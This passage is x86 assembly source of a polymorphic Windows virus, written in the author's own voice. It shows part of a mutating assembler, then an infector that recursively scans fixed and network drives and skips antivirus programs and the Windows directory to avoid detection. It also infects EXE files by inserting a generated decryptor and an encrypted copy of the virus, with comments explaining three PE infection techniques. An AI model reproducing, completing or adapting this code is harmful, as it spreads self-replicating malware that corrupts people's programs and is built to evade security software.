                cmp     eax, esi        ; Have we coded it already?
                jb    @@Assemble_Jump_Backwards
     @@Assemble_Jump_Fowards:
                mov     ebx, eax        ; Get the distance
                sub     ebx, esi
                cmp     ebx, 0B0h ; 11 (max size of instruction) * 0Bh = 121.
                                  ; It must be < 128 to code a short Jcc
                jbe   @@Assemble_JmpFwd_Short
     @@Assemble_JmpFwd_Long_Set00:
                mov     eax, [esi]          ; Set the opcode
                and     eax, 0FFh
                cmp     eax, 7Fh            ; Jcc?
                jbe   @@Assemble_JmpFwd_Long_Jcc
     @@Assemble_JmpFwd_Long_Set:
                mov     [edi], eax          ; Set the opcode
                call    Asm_AddToRelocTable ; Add it to the post-assembly
                add     edi, 5              ; relocation work
                ret
     @@Assemble_JmpFwd_Long_Jcc:
                mov     eax, 0Fh         ; Set the opcode 0F
                mov     [edi], eax
                add     edi, 1
                mov     eax, [esi]       ; Get the Jcc opcode, add 10h to it
                add     eax, 10h         ; (by x86 specifications :) and set
                jmp   @@Assemble_JmpFwd_Long_Set ; it in the same way the
                                                 ; short one.
     @@Assemble_JmpFwd_Short:
                call    Random           ; Get a random decision over the
                and     eax, 7           ; codification of this jump: short
                or      eax, eax         ; or long? (long with a 1/8 of prob.)
                jz    @@Assemble_JmpFwd_Long_Set00
                mov     eax, [esi]       ; Get the opcode
                and     eax, 0FFh
                cmp     eax, 0E8h                 ; CALL?
                jz    @@Assemble_JmpFwd_Long_Set  ; Then, set long for sure
                cmp     eax, 0E9h                 ; JMP?
                jz    @@Assemble_JmpFwd_Short_JMP ; Then, set short
     @@Assemble_JmpFwd_Short_Set:
                mov     [edi], eax                ; Set the opcode
                call    Asm_AddToRelocTable       ; Add it to post-assembly
                add     edi, 2                    ; relocations
                ret
     @@Assemble_JmpFwd_Short_JMP:
                add     eax, 2            ; Convert the E9 opcode to EB
                jmp   @@Assemble_JmpFwd_Short_Set

     @@Assemble_Jump_Backwards:
                mov     ebx, [eax+0Ch]    ; Get the address of the label
                sub     ebx, edi
                sub     ebx, 2            ; Get the displacement in EBX
                cmp     ebx, 0FFFFFF80h   ; If backwards displacement <= 128,
                jb    @@Assemble_Jump_Backwards_Long ; we can use short jumps.
                                                     ; If not, jump
                mov     eax, [esi]        ; Get the opcode
                cmp     al, 0E8h          ; If it's CALL, it's long (and just
                jz    @@Assemble_Jump_Backwards_Long ; imagine a fist hitting
                                                   ; a table categorically XD)
                call    Random
                and     eax, 7
                or      eax, eax          ; Get a random decision to code it
                jz    @@Assemble_Jump_Backwards_Long ; short or long
                mov     eax, [esi]
                cmp     al, 0E9h          ; JMP opcode?
                jnz   @@Assemble_Jump_StoreOpcode_Short ; If not, jump
                add     eax, 2                          ; Make it 0EBh
     @@Assemble_Jump_StoreOpcode_Short:
                mov     [edi], eax        ; Store the opcode
                add     edi, 1
                mov     [edi], ebx        ; Store the displacement
                add     edi, 1
                ret
     @@Assemble_Jump_Backwards_Long:
                mov     eax, [esi]        ; Get the opcode
                cmp     al, 0E9h                     ; JMP?
                jz    @@Assemble_Jump_Backwards_JMP  ; Then, jump there
                cmp     al, 0E8h                     ; CALL?
                jz    @@Assemble_Jump_Backwards_JMP  ; Then, jump there
                sub     ebx, 4           ; Subtract the length that we haven't
                mov     eax, 0Fh         ; subtracted yet
                mov     [edi], eax      ; Set the first opcode of the long Jcc
                add     edi, 1
                mov     eax, [esi]       ; Set the 2nd opcode
                add     eax, 10h
     @@Assemble_Jump_Backwards_Long_Common:
                mov     [edi], eax       ; Set the opcode
                add     edi, 1
                mov     [edi], ebx       ; Set the displacement
                add     edi, 4
                ret
     @@Assemble_Jump_Backwards_JMP:
                sub     ebx, 3           ; Set the opcode (JMP or CALL)
                jmp   @@Assemble_Jump_Backwards_Long_Common
                ret
AssembleInstruction endp


;; This function adds the current storage EIP to the post-assembly relocation
;; table. After all the code is assembled, we'll fix the displacements stored
;; in this table.
Asm_AddToRelocTable proc
                mov     ebx, [ebp+JumpRelocationTable] ; Get the last element
                mov     ecx, [ebp+NumberOfJumpRelocations] ; of the table
                add     ebx, ecx
                mov     [ebx], edi        ; Store the address for fixing
                mov     eax, [esi+1]      ; Store the label of destiny
                mov     [ebx+4], eax
                add     ecx, 8            ; Increase the last element pointer
                mov     [ebp+NumberOfJumpRelocations], ecx
                ret
Asm_AddToRelocTable endp

;; This function will construct the opcode reference to a memory address using
;; the common memory address structure of our pseudoassembler. It will recode
;; the address using randomly one of the possible codifications for every
;; situation, as I expose here:
;;
;; Memory codification variants:
;;
;; Direct address
;;     05 xx xx xx xx
;;     04 25 xx xx xx xx
;;
;; 1 index + 0
;;     0x (not valid if x = 5)
;;     4x 00
;;     8x 00 00 00 00
;;     04 00xxx101 00 00 00 00
;;     44 00100xxx 00
;;     84 00100xxx 00 00 00 00
;; 1 index + byte (< 80h or > FFFFFF7Fh)
;;     4x yy
;;     8x yy ss ss ss
;;     04 00xxx101 yy ss ss ss
;;     44 00100xxx yy
;;     84 00100xxx yy ss ss ss
;; 1 index + dword
;;     8x yy yy yy yy
;;     04 00xxx101 yy yy yy yy
;;     84 00100xxx yy yy yy yy
;; 1 index * N + 0
;;     04 nnxxx101 00 00 00 00
;; 1 index * N + byte
;;     04 nnxxx101 yy ss ss ss
;; 1 index * N + dword
;;     04 nnxxx101 yy yy yy yy
;;
;; 2 index + 0 (xx(*nn),yy,zzzzzzzz)
;;     04 nnxxxyyy (yyy != 5)
;;     44 nnxxxyyy 00
;;     84 nnxxxyyy 00 00 00 00
;; 2 index + byte (<80h or > FFFFFF7Fh) (xx(*nn),yy,zzzzzzzz)
;;     44 nnxxxyyy zz
;;     84 nnxxxyyy zz ss ss ss
;; 2 index + dword (xx(*nn),yy,zzzzzzzz)
;;     84 nnxxxyyy zz zz zz zz
;;
;; The codification of the memory address will be done at [EDI], while EBX
;; can hold a value to OR to the 1st codified opcode (for example, registers
;; or operations that must be in this opcode). The function returns with all
;; prepared to follow the codification, this means, all the pointers
;; are increased and the memory address is completely finished, not having
;; to make anything more related with the memory address.
;; 
Asm_MakeMemoryAddress proc
                mov     ecx, [esi+1]
                and     ecx, 0FFh
                mov     eax, [esi+2]
                and     eax, 0FFh
                cmp     eax, ecx
                jae   @@Next00
                mov     edx, eax
                jmp   @@Next01
   @@Next00:    mov     edx, ecx
                mov     ecx, eax

   ; Now, ECX > EDX. ECX will hold also the multiplicator if we use one for
   ; this instruction. If not, it could be exchanged with EDX further on the
   ; algorithm.

   @@Next01:    cmp     edx, 8         ; I decided to not commenting this :).
                jz    @@NoIndex1       ; The code is clear and understandable,
                cmp     ecx, 8         ; and I'm tired of commenting code!
                jz    @@Only1Index
                cmp     ecx, 7
                ja    @@NoExchange
                call    RandomBoolean
                or      eax, eax
                jz    @@NoExchange
                mov     eax, ecx
                mov     ecx, edx
                mov     edx, eax
   @@NoExchange:
                mov     eax, [esi+3]
                or      eax, eax
                jz    @@2Index_0
                cmp     eax, 7Fh
                jbe   @@2Index_Byte
                cmp     eax, 0FFFFFF80h
                jae   @@2Index_Byte
   @@2Index_Dword:
                mov     eax, 84h
   @@2Index_Dword_Subr:
                push    eax
                mov     eax, ecx
                and     eax, 0C0h
                shl     ecx, 3
                and     ecx, 38h
                add     eax, ecx
                add     edx, eax
                pop     eax
                jmp   @@SetMemory01
   @@2Index_Byte:
                call    RandomBoolean
                or      eax, eax
                jz    @@2Index_Dword
                mov     eax, 44h
                call  @@2Index_Dword_Subr
                sub     edi, 3
                ret
   @@2Index_0:
                call    RandomBoolean
                or      eax, eax
                jz    @@2Index_Byte
                cmp     edx, 5
                jz    @@2Index_Byte
                mov     eax, 04h
                call  @@2Index_Dword_Subr
                sub     edi, 4
                ret

   @@Only1Index:
                ; EDX = Index, no scalar (if not, it would be ECX)
                mov     eax, [esi+3]
                or      eax, eax
                jz    @@Only1Index_0
                cmp     eax, 7Fh
                jbe   @@Only1Index_Byte
                cmp     eax, 0FFFFFF80h
                jae   @@Only1Index_Byte
   @@Only1Index_Dword:
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@Only1Index_Dword
                cmp     eax, 1
                jz    @@Only1Index_Dword_01
                cmp     eax, 2
                jz    @@Only1Index_Dword_02
   @@Only1Index_Dword_03:
                mov     eax, 84h
                add     edx, 20h
                jmp   @@SetMemory01
   @@Only1Index_Dword_02:
                mov     eax, 04h
                shl     edx, 3
                add     edx, 5
                jmp   @@SetMemory01
   @@Only1Index_Dword_01:
                add     edx, 80h
                add     edx, ebx
                mov     [edi], edx
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 5
                ret
   @@Only1Index_Byte:
                call    RandomBoolean
                or      eax, eax
                jz    @@Only1Index_Dword
                call    RandomBoolean
                or      eax, eax
                jz    @@Only1Index_Byte_01
   @@Only1Index_Byte_02:
                mov     eax, 44h
                add     eax, ebx
                mov     [edi], eax
                add     edx, 20h
                mov     [edi+1], edx
                mov     eax, [esi+3]
                mov     [edi+2], eax
                add     edi, 3
                ret
   @@Only1Index_Byte_01:
                add     edx, 40h
                add     edx, ebx
                mov     [edi], edx
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 2
                ret
   @@Only1Index_0:
                call    RandomBoolean
                or      eax, eax
                jz    @@Only1Index_Byte
                cmp     edx, 5
                jz    @@Only1Index_Byte
                add     edx, ebx
                mov     [edi], edx
                add     edi, 1
                ret

   @@NoIndex1:  cmp     ecx, 8   ; If EDX = 8, then ECX >= 8
                jz    @@DirectAddress
                mov     edx, ecx
                and     edx, 0C0h
                and     ecx, 7
                shl     ecx, 3
                add     edx, ecx
                add     edx, 5
                mov     eax, 4
   @@SetMemory01:
                add     eax, ebx
                mov     [edi], eax
                mov     [edi+1], edx
                mov     eax, [esi+3]
                mov     [edi+2], eax
                add     edi, 6
                ret
   @@DirectAddress:
                mov     eax, 05h
                add     eax, ebx
                mov     [edi], eax
                mov     eax, [esi+3]
                mov     [edi+1], eax
                add     edi, 5
                ret
Asm_MakeMemoryAddress endp
;;
;;
;; End of the assembler
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!Infector
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The infector
;; ------------
;;
;; The infector is the part that brings this virus the category of "virus" :).
;; The infection made here is quite complex: there are three types of
;; supported modes, depending on the configuration of the executable:
;;
;; 1) Midinfection with section shifting
;;
;;   The most difficult to make but also the most difficult to detect. It
;;   can only be performed if there is a .reloc section in the executable.
;;   We extend the end of the .text section and we shift down the sections
;;   under this one. In this way, the decryptor/copier executes in the
;;   .text section without overwriting code. The data being encrypted/moved
;;   is stored at the beginning of the .data section: again, we shift the
;;   sections down but this time extending the size of .data and all the
;;   bytes stored here are shifted down.
;;   To make this, all the offset references to points of the executable that
;;   are going to be shifted down must be updated: we do that with the help
;;   of the .reloc section.
;;
;; 2) Midinsertion of the decryptor, data at last section
;;
;;   If we cannot make the first infection method we pass to this one. We
;;   look for holes in the section padding (virtual or physical holes),
;;   calculate the maximum size the decryptor can have there and we insert
;;   it. The virus data will be stored at the end of the last section, but
;;   without modifying the flags of the section (at least must be readable).
;;   In fact, if the section is writable we don't infect that executable.
;;
;; 3) All data at last section
;;
;;   If there aren't holes between sections or the padding isn't enough big
;;   to hold a minimum fixed size, then we make a standard infection: we make
;;   the last section bigger and put all the code there (the 29A technique).
;;
;; The infection mark will be the field of the CRC of the executable. If the
;; CRC is 0, the file is already infected. If not, the file is clean and we
;; set that field to 0 if we successfully infected the file. Since there are
;; lots of files with this field being 0, the detection can't rely on the
;; infection mark.
;;
;;
InfectFiles     proc
                xor     eax, eax      ; Set the directory deepness to 0
                mov     [ebp+DirectoryDeepness], eax

                call    InfectFiles2  ; First, the current directory

                mov     ebx, [ebp+FindFileData]
                add     ebx, 1000h
    @@LoopGetDrives:
                xor     eax, eax      ; Now set again this to 0
                mov     [ebp+DirectoryDeepness], eax

                push    eax         ; Get the logical drives in this computer.
                push    ecx
                push    edx
                mov     eax, [ebp+FindFileData]
                add     eax, 1000h
                push    eax
                mov     eax, 200h
                push    eax
                call    dword ptr [ebp+RVA_GetLogicalDriveStringsA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax       ; If error, exit
                jz    @@Error2

                push    eax
                push    ecx
                push    edx

                mov     eax, ebx       ; Get the type of drive. We only infect
                push    eax            ; it if it's DRIVE_FIXED (3) or
                call    dword ptr [ebp+RVA_GetDriveTypeA] ; DRIVE_NETWORK (4)
                mov     [ebp+ReturnValue], eax

                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                cmp     eax, 3    ; DRIVE_FIXED
                jz    @@InfectDrive
                cmp     eax, 4    ; DRIVE_NETWORK
                jnz   @@NextDrive


       @@InfectDrive:
                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, ebx
                push    eax   ; Avoid a sequence of 4 pushes (just in case)
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx            ; Set the current directory as the
                pop     eax            ; drive string returned by the function

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2         ; If error, return

                push    ebx
                call    InfectFiles2   ; Infect the drive.
                pop     ebx

      @@NextDrive:

      @@LoopFindNull:
                add     ebx, 1         ; Get the next drive. If we reach to
                mov     eax, [ebx]     ; a double NULL, then exit (end of
                and     eax, 0FFh      ; drives string).
                or      eax, eax
                jnz   @@LoopFindNull
                add     ebx, 1
                mov     eax, [ebx]
                and     eax, 0FFh
                or      eax, eax
                jnz   @@LoopGetDrives  ; Next drive
     @@Error2:
                ret
InfectFiles     endp

;; This function is a separated one from above to allow recursivity. When we
;; infect a directory, we can get more directories in the file listing, so
;; we set that directory as the current and we call this function again (but
;; first increasing the directory deepness to avoid infecting all the drive
;; every execution).
InfectFiles2    proc
                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, [ebp+FindFileData]
                push    eax
                mov     edx, [ebp+OtherBuffers]
                push    edx

                mov     eax, '*.*'     ; Get all files
                mov     [edx], eax

                call    dword ptr [ebp+RVA_FindFirstFileA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                cmp     eax, -1
                jz    @@Error
                mov     [ebp+hFindFile], eax
     @@TouchAgain:
                mov     edx, [ebp+FindFileData] ; Get the attributes
                mov     eax, [edx]
                and     eax, 10h          ; Check if it's a directory
                or      eax, eax
                jz    @@TryToInfectFile   ; If it isn't, jump to try to infect


                mov     eax, [ebp+DirectoryDeepness]
                cmp     eax, 3            ; If we are too deep in recursivity
                jz    @@InfectNextFile    ; just ignore the directory.
                mov     eax, [edx+2Ch]
                and     eax, 0FFFFFFh     ; See if the directory name is ".."
                cmp     eax, '..'
                jz    @@InfectNextFile    ; If it is, ignore it
                and     eax, 0FFFFh
                cmp     eax, '.'          ; Is it "."?
                jz    @@InfectNextFile    ; Then, ignore it
                and     eax, 01Fh
                cmp     eax, 'W' AND 1Fh  ; Do the name begins with "W"?
                jz    @@InfectNextFile    ; Then, ignore it. In this way we
                                      ; avoid infecting files in the Windows
                                      ; directory (and the action of the SFP
                                      ; noticing the user).
                push    eax
                push    ecx
                push    edx    ; APICALL_BEGIN

                mov     eax, edx
                add     eax, 2Ch      ; Set the directory as the current.
                push    eax
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax           ; If we couldn't, find next file
                jz    @@InfectNextFile

                mov     eax, [ebp+DirectoryDeepness]
                add     eax, 1             ; Increase the directory recurs.
                mov     [ebp+DirectoryDeepness], eax

                mov     eax, [ebp+hFindFile]  ; Save the FileFind handle
                push    eax
                call    InfectFiles2          ; Calling me from my guts!
                pop     eax
                mov     [ebp+hFindFile], eax  ; Restore the FileFind handle

                mov     eax, [ebp+DirectoryDeepness]
                sub     eax, 1             ; Decrease the directory deepness
                mov     [ebp+DirectoryDeepness], eax

                mov     edx, [ebp+FindFileData]
                mov     eax, '..'          ; Set as current the directory
                mov     [edx], eax         ; above in the tree. Doing this
                                      ; we avoid to save everytime the name
                push    eax           ; of the directory we came from.
                push    ecx
                push    edx

                mov     eax, edx
                push    eax           ; Set ".." as the current directory
                call    dword ptr [ebp+RVA_SetCurrentDirectoryA]
                mov     [ebp+ReturnValue], eax

                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2         ; If error, just finish the infection
                jmp   @@InfectNextFile ; If no error, continue

    ;; Here if we found a file
     @@TryToInfectFile:
                xor     eax, eax
                call    RandomBoolean_X000_3
                ;call    RandomBoolean  ; WEIGHT_X000
                or      eax, eax
                jz    @@InfectNextFile ; Infect only the 50% of the files
                           ; but based on our genetic algorithm. By evolution,
                           ; only the more spreaded or the more stealthy will
                           ; "survive".
                mov     edx, [ebp+FindFileData]
                add     edx, 2Ch       ; EDX = offset to the file name

;; Uncomment this for debugging the virus. With this code the virus will only
;; infect files starting with "goat"
;                 mov     eax, [edx]
;                 and     eax, 1F1F1F1Fh
;                 cmp     eax, 'taog' AND 1F1F1F1Fh
;                 jnz   @@InfectNextFile

                mov     eax, [edx]       ; Get the two first letters
                and     eax, 1F1Fh
                cmp     eax, '-F' AND 1F1Fh  ; Check for F-PROT
                jz    @@InfectNextFile       ; If it is, avoid the infection
                cmp     eax, 'AP' AND 1F1Fh  ; Check for PANDA
                jz    @@InfectNextFile
                cmp     eax, 'CS' AND 1F1Fh  ; Check for SCAN*, SCN*, etc.
                jz    @@InfectNextFile
                cmp     eax, 'RD' AND 1F1Fh  ; Check for DRWEB
                jz    @@InfectNextFile
                cmp     eax, 'ON' AND 1F1Fh  ; Check for NOD-ICE, NORTON, etc.
                jz    @@InfectNextFile

                mov     ebx, edx
     @@LoopFindExtension:
                mov     eax, [ebx]    ; Avoid files with a "V" in the name.
                and     eax, 01Fh     ; With that we avoid AVP, NAV, and lots
                cmp     eax, 'V' AND 1Fh ; of antivirus.
                jz    @@InfectNextFile
                or      eax, eax
                jz    @@CheckExtension
                add     ebx, 1
                jmp   @@LoopFindExtension
     @@CheckExtension:
                mov     eax, [ebx-4]     ; Finally, is it an EXE file?
                and     eax, 1F1F1FFFh
                cmp     eax, 'EXE.' AND 1F1F1FFFh
                jnz   @@InfectNextFile   ; If not, don't infect!

      @@InfectFile:
                call    TouchFile   ; Infect the file with our brand recently
      @@InfectNextFile:             ; reassembled code.
                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN
                mov     eax, [ebp+FindFileData]
                push    eax
                mov     eax, [ebp+hFindFile]
                push    eax
                call    dword ptr [ebp+RVA_FindNextFileA]
                mov     [ebp+ReturnValue], eax    ; Find the next file/dir of
                pop     edx                       ; the directory
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]  ; If error, finish
                or      eax, eax
                jnz   @@TouchAgain
      @@Error2:
                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN
                mov     eax, [ebp+hFindFile]    ; Close the FindFile handle
                push    eax
                call    dword ptr [ebp+RVA_FindClose]
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END
      @@Error:
                ret
InfectFiles2    endp

;; This function infects the file. It saves the original attributes, clears
;; them (removing any read-only setting), opens a mapping of the file and
;; performs all the operations. After that, it uses the info in the FindFile
;; data to restore the original date/time, restores the attributes and exits.
TouchFile       proc
                mov     [ebp+Addr_FilePath], edx ; Save the file path address

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                push    edx
                call    dword ptr [ebp+RVA_GetFileAttributesA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue] ; If there was an error getting
                cmp     eax, -1                ; the attributes just exit
                jz    @@Error_
                mov     [ebp+FileAttributes], eax ; Save the attributes

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN
                push    80h
                mov     eax, [ebp+Addr_FilePath]  ; Set normal file attributes
                push    eax
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error_               ; If error, finish

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                push    0
                push    0
                push    3          ; OPEN_EXISTING
                push    0
                push    0
                push    0C0000000h ; Generic read & write
                push    edx
                call    dword ptr [ebp+RVA_CreateFileA] ; Open the file
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                cmp     eax, -1           ; If error, finish
                jz    @@Error
                mov     [ebp+hFile], eax

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                push    0
                push    eax
                call    dword ptr [ebp+RVA_GetFileSize]
                mov     [ebp+ReturnValue], eax
                pop     edx               ; Get the current file size.
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2            ; If error, finish
                mov     [ebp+FileSize], eax          ; Set the tracking size
                mov     [ebp+OriginalFileSize], eax  ; Set the original size

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                push    0
                add     eax, [ebp+RoundedSizeOfNewCode]
                add     eax, 1000h ; Maximum size of decryptor
                push    eax
                push    0
                push    4  ; PAGE_READWRITE
                push    0
                mov     eax, [ebp+hFile]      ; Create a file mapping with a
                push    eax                   ; size of original file's size +
                call    dword ptr [ebp+RVA_CreateFileMappingA] ; + the new size
                mov     [ebp+ReturnValue], eax   ; of the virus + the maximum
                pop     edx                      ; size we use for a decryptor
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2                ; If error, just finish
                mov     [ebp+hMapping], eax

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                push    0
                push    0
                push    0
                push    0F001Fh
                push    eax
                call    dword ptr [ebp+RVA_MapViewOfFile]
                mov     [ebp+ReturnValue], eax
                pop     edx                ; Map a view of the file mapping
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error3             ; If error, exit

                mov     dword ptr [ebp+MappingAddress], eax ; Set the address

     ; Needed variables:
     ; [MappingAddress] = Mapping address of file. The mapping
     ;  must have the size of the two holes already increased.
     ; Return:
     ;  EAX = 0 if everything is OK,
     ;   [HeaderAddress] = PE header address
     ;   [Phys_TextHole] = Physical address of hole in code section
     ;   [RVA_TextHole] = Virtual address of hole in code section
     ;   [Phys_DataHole] = Physical address of hole in data section
     ;   [RVA_DataHole] = Virtual Address of hole in data section
     ;   [ExitProcessAddress] != 0 if ExitProcess was found and
     ;     patched to point to the zone the decryptor is going to be.
     ;  EAX != 0 if something failed
                xor     eax, eax        ; Initialize the Undo buffer (for
                mov     [ebp+NumberOfUndoActions], eax ; undo the changes to
                                                ; the file if we had an error)
                call    PrepareFile    ; Make the holes
                or      eax, eax       ; Error?
                jnz   @@Error4         ; EAX != 0 if error, so exit

                mov     ebx, [ebp+MappingAddress] ; Get the physical address
                add     ebx, [ebp+Phys_TextHole]  ; in the mapping where the
                                                  ; decryptor must be.
;;;;;;
; Now we create the decryptor and we copy the code, which will be unencrypted
; once in every 16 infections
;;;;;;
                mov     ecx, [ebp+MaxSizeOfDecryptor] ; Get the maximum size
                cmp     ecx, 400h             ; we can have for the decryptor
                jbe   @@SetSizeOfExpansionTo0 ; If it's 400h, set a size of
                mov     eax, 1                ; expansion to the Expander of
                call    RandomBoolean_X000_3  ; 0 (three recursivity levels).
                or      eax, eax
                jz    @@SetSizeOfExpansionTo0 ; Also we can select randomly
                                              ; that level instead of a deeper
                                              ; one (genetically!)
                mov     eax, -1               ; Set the initial level to -1
                jmp   @@SetSizeOfExpansion    ; (four levels of recursivity).
      @@SetSizeOfExpansionTo0:
                mov     eax, 2
                call    RandomBoolean_X000_3  ; Get a random TRUE or FALSE
                                              ; depending on previous
                                              ; generations values.
                or      eax, eax              ; If FALSE, set only two levels
                jz    @@SetSizeOfExpansionTo1 ; of recursivity (set the initial
                xor     eax, eax              ; level to 1)
                jmp   @@SetSizeOfExpansion
      @@SetSizeOfExpansionTo1:
                mov     eax, 1
      @@SetSizeOfExpansion:
                mov     [ebp+SizeOfExpansion], eax ; Set -1, 0 or 1 (depending
                                                ; on all the conditions above)

      @@CheckWithOtherSizeOfExpansion:
                mov     ecx, 3         ; Set the number of times we'll try
                                       ; to get a decryptor with a size that
                                       ; fits into the maximum size set.
      @@GenerateOther:
                push    ecx            ; Save the count
                mov     edi, [ebp+DecryptorPseudoCode] ; Get the storage addr.
                mov     eax, [ebp+VirtualAllocAddress] ; Save this address
                push    eax
                call    MakeDecryptor    ; Make a decryptor for this infection
                pop     eax              ; Restore this address
                mov     [ebp+VirtualAllocAddress], eax
                pop     ecx             ; Decrease the number of times we
                sub     ecx, 1          ; can repeat the decryptor generation
                mov     eax, [ebp+SizeOfDecryptor] ; Check the size of the
                cmp     eax, [ebp+MaxSizeOfDecryptor] ; new decryptor.
                jbe   @@SizeOfDecryptorOK             ; If it fits, jump
                or      ecx, ecx                   ; ECX = 0?
                jnz   @@GenerateOther              ; If not, generate other
                mov     eax, [ebp+SizeOfExpansion] ; Check if the size of
                cmp     eax, 2             ; expansion is already the minimum.
                jz    @@InsertExitProcess  ; If it is, insert directly a call
                      ; to ExitProcess (to make the host run without problems).
                add     eax, 1             ; If not, decrease the recursivity
                mov     [ebp+SizeOfExpansion], eax  ; the expander can make and
                jmp   @@CheckWithOtherSizeOfExpansion ; try again.

    ; Here we insert a call to ExitProcess if we couldn't generate a decryptor
    ; following our specifications.
      @@InsertExitProcess:
                mov     edi, [ebp+Phys_TextHole]    ; Get the address for
                add     edi, [ebp+MappingAddress]   ; code insertion
                mov     eax, 6Ah
                mov     [edi], eax          ; Insert "PUSH 0"
                add     edi, 2
            ;    xor     eax, eax
            ;    mov     [edi], eax
            ;    add     edi, 1
                mov     eax, 15FFh          ; Insert "CALL ExitProcess"
                mov     [edi], eax
                add     edi, 2
                mov     eax, [ebp+ExitProcessAddress]
                mov     [edi], eax
                jmp   @@Exit

      @@SizeOfDecryptorOK:           ; Now let's copy the decryptor in the
                mov     esi, [ebp+AssembledDecryptor]  ; hole we made for it.
                mov     edi, [ebp+Phys_TextHole]
                add     edi, [ebp+MappingAddress]
                mov     ecx, [ebp+SizeOfDecryptor]
      @@LoopCopyDecryptor:
                mov     eax, [esi]       ; Copy the assembled decryptor
                mov     [edi], eax
                add     esi, 1
                add     edi, 1
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopCopyDecryptor

                mov     edx, 10h         ; Maximum number of times we can
                                         ; repeat the following:
                mov     esi, [ebp+MaxSizeOfDecryptor]
                sub     esi, [ebp+SizeOfDecryptor]
                and     esi, 0FFFFFFFCh    ; Get the remaining size of the
                or      esi, esi           ; decryptor aligned to DWORDs.
                jz    @@ContinueWithTheRest ; If 0, don't make this thing
       @@CheckAgainThePossibility:
                call    Random      ; Get a random number between 0 and 252
                and     eax, 0FCh
                or      eax, eax    ; If 0, repeat
                jz    @@CheckAgainThePossibility
                sub     edx, 1      ; Decrease the number of times we can do
                                    ; this again.
                cmp     eax, esi    ; If the random number is below the
                jb    @@FillRandomBytes ; remaining size, go to fill some.
                or      edx, edx        ; If don't, and we can make it more
                jnz   @@CheckAgainThePossibility ; times, get another random
                jmp   @@ContinueWithTheRest      ; number.
      @@FillRandomBytes:
                mov     ecx, eax    ; ECX = Number of random bytes to insert
      @@LoopFillRandomBytes:
                call    Random
                mov     [edi], eax  ; Insert a random DWORD
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx    ; Fill it with the random quantity we got
                jnz   @@LoopFillRandomBytes ; before

      @@ContinueWithTheRest:
                mov     edi, [ebp+MappingAddress] ; Get the physical address
                add     edi, [ebp+Phys_DataHole]  ; of the data hole
                cmp     edi, [ebp+MappingAddress] ; If it's 0, exit
                jz    @@Exit
                mov     edx, [ebp+TypeOfEncryption] ; Get the encryption
                mov     ebx, [ebp+EncryptionKey]    ; operation and the
                mov     esi, [ebp+NewAssembledCode] ; address of the new
                mov     ecx, [ebp+SizeOfNewCode]    ; mutated code
                and     ecx, 0FFFFFFFCh
                add     ecx, 4             ; Round it
     @@LoopEncryptCode:
                mov     eax, [esi]
                or      ebx, ebx           ; Copy the code and encrypt it
                jz    @@NoEncryption       ; on the fly
                or      edx, edx
                jz    @@ADDKey
                cmp     edx, 1
                jz    @@SUBKey
        @@XORKey:
                xor     eax, ebx
                jmp   @@StoreDWORD
        @@ADDKey:
                add     eax, ebx
                jmp   @@StoreDWORD
        @@SUBKey:
                sub     eax, ebx
        @@NoEncryption:
        @@StoreDWORD:
                mov     [edi], eax         ; Store the encrypted (or not)
                add     esi, 4             ; DWORDs
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopEncryptCode
                xor     eax, eax
                mov     [edi], eax         ; Set a 0 at the end

     @@Exit:    mov     ebx, [ebp+HeaderAddress]
